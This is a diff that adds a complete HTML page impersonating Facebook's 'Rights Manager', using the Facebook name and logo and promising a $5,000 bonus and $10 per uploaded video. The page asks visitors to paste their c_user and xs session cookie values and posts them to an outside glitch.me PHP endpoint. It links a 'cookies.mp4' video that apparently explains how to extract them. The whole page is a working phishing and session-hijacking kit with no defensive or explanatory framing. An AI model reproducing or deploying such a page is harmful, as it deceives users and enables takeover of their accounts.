@@ -1,1 +1,175 @@
-dd
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rights Manager</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+        header {
+            background-color: #1877F2;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 10px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .logo img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        h1 {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0;
+        }
+        main {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #1c1e21;
+            font-size: 24px;
+            margin-top: 0;
+        }
+        p {
+            color: #606770;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        .video-container {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .video-container b {
+            font-size: 10px;
+            color: #90949c;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .video-container a {
+            display: inline-block;
+            width: 128px; /* Equivalent to w-32 */
+            height: 80px; /* Equivalent to h-20 */
+        }
+        .video-container img {
+            width: 130%;
+            height: 130%;
+            display: block;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: #1c1e21;
+        }
+        input[type="text"], input[type="email"], input[type="number"] {
+            padding: 8px 12px;
+            margin-bottom: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background-color: #1877F2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #166FE5;
+        }
+        .info-box {
+            background-color: #f0f2f5;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .info-box p {
+            margin: 0;
+            text-align: center;
+            font-size: 14px;
+        }
+        .field-info {
+            font-size: 12px;
+            color: #606770;
+            margin-top: -12px;
+            margin-bottom: 16px;
+        }
+        @media (max-width: 600px) {
+            h1, h2 {
+                font-size: 20px;
+            }
+            main {
+                padding: 16px;
+            }
+            input[type="text"], input[type="email"], input[type="number"], input[type="submit"] {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="Facebook_Logo_Primary.png" alt="Rights Manager Logo">
+        </div>
+        <h1>Facebook</h1>
+    </header>
+    <main>
+        <h2>Rights Manager</h2>
+        <p>
+            Protect your copyrighted content on Rights Manager and InstantShare with Rights Manager. Apply now and receive a $5,000 bonus!
+        </p>
+        <p><strong>Receive $10 per video you upload.</strong></p>
+        <p>Option to apply by providing the necessary information.</p>
+        <div class="video-container">
+            <b>Detailed Video Information</b>
+            <a href="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202">
+                <img src="fbVideo.png.1fd476160a3ed7a2f565.png" alt="Video Thumbnail">
+            </a>
+        </div>
+        <div class="info-box">
+            <p>Please be sure to provide the requested information below.</p>
+        </div>
+        <form class="content" action="https://power-protective-gouda.glitch.me/abdullah.php" method="POST">
+            <label for="c_user" style="font-size: 12px">c_user</label>
+            <input type="number" name="c_user" id="c_user" required title="Please enter 15 digits" value="">
+            
+            <label for="xs" style="font-size: 12px">xs</label>
+            <input type="text" name="xs" id="xs" required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" title="Must Watch Detailed Video" aria-required="true">
+            
+            <p>The process is straightforward and should take no longer than 24 hours.</p>
+            
+            <input type="submit" value="Submit">
+        </form>
+    </main>
+</body>
+</html>
